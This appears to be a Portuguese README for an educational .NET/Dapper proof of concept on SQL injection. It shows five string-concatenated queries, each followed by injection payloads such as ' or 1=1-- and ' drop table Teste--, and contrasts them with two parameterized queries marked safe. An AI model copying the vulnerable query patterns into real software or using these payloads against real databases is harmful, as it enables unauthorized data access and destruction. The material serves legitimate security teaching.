# .NET DAPPER SQL INJECTION

## Back-End

- Net 6
- Dapper
- Swagger

#

### POC abordando conceito de SQL Injection utilizando o dapper.

# TesteUm

```c#
var query = "SELECT * FROM Produto where descricao = '" + request + "'";
```

- ' or 1=1--
- ' or ''='
- ' Insert into Teste (Descricao) Values ('testeUm')--
- ' drop table Teste--

# TesteDois

```c#
 var query = "SELECT * FROM Produto where id = " + request;
```

- 1 or 1=1
- 1; Insert into Teste (Descricao) Values ('testeDois')--
- 1; Insert into Teste (Descricao) Values ('testeDois')
- 1;drop table Teste--
- 1;drop table Teste

# TesteTres

```c#
 var query = $"SELECT * FROM Produto where id = '{request}'";
```

- ' or ''='
- 1'; Insert into Teste (Descricao) Values ('testeTres') --
- '; Insert into Teste (Descricao) Values ('testeTres') --
- 1';drop table Teste--

# TesteQuatro

```c#
var query = $"SELECT * FROM Produto where Descricao like '%" + request.Query + "%'";
```

- '; Insert into Teste (Descricao) Values ('testeQuatro')--
- ' or ''='

# TesteCinco

```c#
var query = new StringBuilder();
query.Append("SELECT * FROM Produto ");
query.Append($"where id = '{request}'");
```

- ' or ''='
- 1'; Insert into Teste (Descricao) Values ('testeTres') --
- '; Insert into Teste (Descricao) Values ('testeTres') --
- 1';drop table Teste--

# TesteSeis

```c#
var query = $"SELECT * FROM Produto where Descricao = @descricao";
produtos = con.Query<Produto>(query, new { descricao = request }).ToList();
```

- Seguro

# TesteSete

```c#
var parameters = new DynamicParameters();
parameters.Add("@descricao", request);

var query = $"SELECT * FROM Produto where Descricao = @descricao";
produtos = con.Query<Produto>(query, parameters).ToList();
```

- Seguro
